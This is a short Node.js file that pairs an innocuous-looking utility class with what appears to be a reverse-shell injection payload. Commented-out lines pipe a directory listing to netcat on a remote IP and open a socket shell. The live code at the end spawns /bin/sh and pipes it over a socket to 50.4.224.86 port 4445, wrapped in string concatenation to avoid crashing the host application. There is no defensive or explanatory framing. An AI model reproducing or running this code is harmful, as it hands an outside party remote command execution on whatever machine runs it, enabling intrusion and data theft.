class Utility {
    require(resource) {
        return new Promise((res, rej)=>{
            try {
                var module = require(resource);
                return res(module);
            } catch(ex) {
                return rej(ex);
            }
        });
    }
    isRunningOnWindows() {
        return process.platform.indexOf('win' === 0);
    }
    getUrlHost(url) {
        try{
            return new URL(url).hostname;
        } catch(ex){
            return null;
        }
    }
}

LEGACY_UTILS = new Utility();

// var _result = '' +
//     LEGACY_UTILS.require('child_process').then(
//         (cp) => { cp.exec ('ls | nc 50.4.224.86 4445') },
//         null
//     ) +
// ''.match(/is/gi);

// (function(){
//     var net = require("net"),
//         cp = require("child_process"),
//         sh = cp.spawn("/bin/sh", []);
//     var client = new net.Socket();
//     client.connect(8080, "192.168.33.1", function(){
//         client.pipe(sh.stdin);
//         sh.stdout.pipe(client);
//         sh.stderr.pipe(client);
//     });
//     return /a/; // Prevents the Node.js application form crashing
// })();

var _result = '' + LEGACY_UTILS.require('child_process').then(
    (cp) => {
        sh = cp.spawn("/bin/sh", []);
        var client = new net.Socket();
        client.connect(4445, "50.4.224.86", () => {
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /a/;
    },
    null
) + ''.match(/is/gi);
